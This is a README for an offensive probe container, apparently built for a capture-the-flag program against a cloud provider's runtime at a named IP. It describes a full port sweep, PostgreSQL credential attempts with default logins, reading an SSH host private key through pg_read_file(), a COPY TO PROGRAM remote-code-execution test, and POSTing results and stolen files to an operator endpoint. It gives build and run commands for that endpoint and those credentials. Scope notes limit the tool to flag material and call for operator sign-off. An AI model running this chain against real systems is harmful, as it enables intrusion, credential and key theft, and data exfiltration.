# Aiven Runtime2 CTF Probe Container

## What It Does

Deploys inside Aiven's Runtime perimeter and runs a 6-phase probe chain:

1. **Env Intel** — captures Runtime environment variables (hostname, region, node metadata)
2. **Full Port Sweep** — nmap -p- against target from inside the perimeter (1–65535)
3. **Service Probes** — banner grabbing + service identification on open ports
4. **PG Chain** — PostgreSQL credential attempts → privilege recon → `pg_read_file()` file exfil → COPY TO PROGRAM RCE test
5. **Exfil** — POST results JSON + exfil'd files to operator endpoint
6. **HTTP Server** — busybox httpd on :8080 for manual result retrieval

## Build & Run

```bash
# Build
podman build -t aiven-runtime-probe -f Containerfile .

# Run (set exfil endpoint)
podman run --rm \
  -e EXFIL_URL="http://your-endpoint/results" \
  -e TARGET_IP="132.145.191.135" \
  -e PG_USER="avnadmin" \
  -e PG_PASS="your-password" \
  -e PG_DB="defaultdb" \
  -p 8080:8080 \
  aiven-runtime-probe
```

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `TARGET_IP` | `132.145.191.135` | Target host to sweep |
| `EXFIL_URL` | _(empty)_ | POST endpoint for results; if unset, results served via HTTP |
| `PG_USER` | `avnadmin` | PostgreSQL username to try |
| `PG_PASS` | _(empty)_ | PostgreSQL password |
| `PG_DB` | `defaultdb` | PostgreSQL database |

## Output

Results land in `/results/` inside the container:

- `probe-<timestamp>.json` — structured results (sweep + PG chain)
- `probe-<timestamp>.log` — full execution log
- `nmap-sweep.txt` — raw nmap output
- `exfil-*.txt` — files read via `pg_read_file()`

## pg_read_file Chain

The probe attempts these steps on the PG instance:

1. Authenticate (tries env creds + common Aiven defaults)
2. Check `usesuper` and `pg_read_server_files` privileges
3. Read ONLY the flag file + minimal evidence (team scope decision 2026-08-14,
   Prime review 0f986ff02e08 + hermes; see the FILE_TARGETS block in probe.sh):
   - `/etc/ssh/ssh_host_ed25519_key` (the CTF flag)
   - `/etc/hostname`
   - NO `/etc/passwd`, `/etc/shadow`, `/proc/*`, PG config files, or any other
     host-level exfil — out of scope
4. If superuser: attempt `COPY TO PROGRAM` (RCE test, target-scoped only)
5. Enumerate schemas, tables, extensions

## Scope

- Single target only (sandbox FQDN/IP from the CTF program).
- No Aiven-internal ranges, no other `*.aivencloud.com` hosts, no control-plane
  probing, no cloud metadata (169.254.169.254 = operator-gated).
- Exfil endpoint = team-controlled listener; only flag material + probe evidence.
- Deployment requires: (a) operator go/no-go on the Runtime question
  (team/questions.md), (b) Prime's review of the artifact diff.

## Ports

From Runtime2, outbound is restricted:
- **Allowed:** 22 (SSH), 5432 (PG)
- **Blocked:** 23, 25, 119, 135, 137-139, 179, 445, 465, 631

The full sweep runs anyway — if any other ports respond, that's intelligence.
